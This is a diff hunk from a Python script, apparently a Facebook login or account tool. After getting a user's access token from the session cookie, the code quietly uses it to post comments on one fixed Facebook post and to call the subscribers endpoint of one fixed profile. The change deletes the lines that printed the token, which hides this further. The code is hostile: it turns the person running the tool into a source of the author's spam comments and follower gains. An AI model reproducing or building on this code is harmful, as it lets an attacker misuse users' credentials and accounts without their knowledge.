@@ -441,12 +441,12 @@ def login_lagi334():
 									nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 									roq = xyz.get(nek,cookies=cookie)
 									tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-									print('')
-									print(tok)
+								
 									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok}", headers = {"cookie":your_cookies})
+									back()
 							except Exception as e:
 								print(e)
 			except Exception as e:
